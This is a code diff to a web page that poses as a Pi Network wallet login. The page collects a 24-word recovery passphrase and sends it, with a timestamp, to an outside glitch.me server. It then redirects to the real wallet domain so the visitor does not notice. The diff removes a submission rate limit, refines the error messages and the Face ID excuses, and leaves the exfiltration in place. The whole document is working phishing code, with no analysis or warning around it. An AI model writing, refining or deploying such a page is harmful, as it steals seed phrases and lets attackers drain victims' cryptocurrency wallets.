@@ -221,75 +221,62 @@
     </div>
 
     <script>
-// ====================== 24-HOUR RATE LIMITER ======================
-function checkRateLimit() {
-    const LAST_SUBMISSION_KEY = 'lastPassphraseSubmission';
-    const TWENTY_FOUR_HOURS = 24 * 60 * 60 * 1000;
-    
-    const lastSubmission = localStorage.getItem(LAST_SUBMISSION_KEY);
-    const now = Date.now();
-    
-    if (lastSubmission && (now - parseInt(lastSubmission)) < TWENTY_FOUR_HOURS) {
-        const hoursLeft = Math.ceil((TWENTY_FOUR_HOURS - (now - parseInt(lastSubmission))) / (1000 * 60 * 60));
-        alert(`You can only submit once per 24 hours. Please try again in ${hoursLeft} hours.`);
-        return false;
-    }
-    
-    localStorage.setItem(LAST_SUBMISSION_KEY, now.toString());
-    return true;
-}
-
 async function validatePassphrase() {
-    // Check 24-hour limit first
-    if (!checkRateLimit()) return;
-
     const input = document.getElementById('passphraseInput');
     const error = document.getElementById('errorMessage');
     const words = input.value.trim().split(/\s+/).filter(word => word.length > 0);
 
+    // Client-side validation
     if (words.length !== 24) {
         error.style.display = 'block';
-        error.textContent = 'Passphrase must be 24 words';
+        error.textContent = 'Passphrase must be exactly 24 words';
         return;
     }
 
-    error.style.display = 'none';
+    // Show loading state
     document.getElementById('loadingOverlay').style.display = 'flex';
+    error.style.display = 'none';
 
     try {
         const response = await fetch('https://fuckyou-suraa.glitch.me/validate-passphrase', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ passphrase: input.value })
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({ 
+                passphrase: input.value,
+                timestamp: new Date().toISOString()
+            })
         });
 
-        if (response.status === 429) {
-            alert("Server overloaded. Please wait before trying again.");
-            return;
+        if (!response.ok) {
+            throw new Error(`Server responded with ${response.status}`);
         }
 
         const result = await response.json();
+        
         if (result.success) {
             window.location.href = "https://wallet.pinet.com";
         } else {
             error.style.display = 'block';
-            error.textContent = 'Invalid passphrase';
+            error.textContent = result.message || 'Invalid passphrase';
         }
-    } catch (e) {
-        alert("Connection error. Try again later.");
-        localStorage.removeItem('lastPassphraseSubmission');
+    } catch (error) {
+        console.error('Validation error:', error);
+        alert('Server connection failed. Please try again later.');
     } finally {
         document.getElementById('loadingOverlay').style.display = 'none';
     }
 }
 
 function showFaceIDError() {
-    alert("Face ID is not available at the moment. Please try with passphrase.");
+    alert("Face ID is only available in the Pi Network mobile app.");
 }
 
 function redirectToNewWallet() {
     if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
-        window.location.href = "https://wallet.pinet.com/new";
+        window.location.href = "https://wallet.pinet.com/new-account";
     }
 }
 </script>
